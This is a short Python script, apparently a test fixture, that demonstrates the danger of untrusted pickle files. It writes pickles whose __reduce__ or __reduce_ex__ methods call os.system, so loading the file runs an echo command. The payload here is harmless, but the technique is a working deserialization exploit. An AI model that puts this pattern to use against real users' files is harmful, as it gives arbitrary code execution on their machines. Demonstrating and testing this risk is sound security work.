# Demonstrates why untrusted pickle files are unsafe (2018-compatible).
# Cross-platform echo and explicit method selection for tests.
import os
import sys
import pickle
import argparse

MARK_BASE = "*** malicious pickle executed (demo) ***"
MARK_EX   = "*** malicious pickle executed via __reduce_ex__ (demo) ***"

def echo_cmd(msg):
    # Build a cross-platform echo command without fragile quotes
    if os.name == "nt":  # Windows cmd.exe
        return "cmd /c echo {m}".format(m=msg)
    else:                # POSIX sh
        return 'sh -c "echo {m}"'.format(m=msg)

class RCE_Reduce(object):
    # Only __reduce__, so pickle will use this path
    def __reduce__(self):
        return (os.system, (echo_cmd(MARK_BASE),))

class RCE_ReduceEx(object):
    # Only __reduce_ex__, so pickle will use this path
    def __reduce_ex__(self, protocol):
        return (os.system, (echo_cmd(MARK_EX),))

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--protocol", type=int, default=2, choices=[0, 1, 2, 3],
                   help="Pickle protocol (0-3 for 2018-era tests)")
    p.add_argument("--method", choices=["reduce", "reduce_ex"], default="reduce",
                   help="Choose the serialization entrypoint to exercise")
    p.add_argument("--out", default="artifacts/malicious.pkl",
                   help="Output pickle path")
    args = p.parse_args()

    out_dir = os.path.dirname(args.out)
    if out_dir and not os.path.exists(out_dir):
        os.makedirs(out_dir)

    obj = RCE_Reduce() if args.method == "reduce" else RCE_ReduceEx()

    with open(args.out, "wb") as f:
        pickle.dump(obj, f, protocol=args.protocol)

    sys.stdout.write("Wrote {path} (protocol={proto}, method={meth})\n"
                     .format(path=args.out, proto=args.protocol, meth=args.method))

if __name__ == "__main__":
    main()
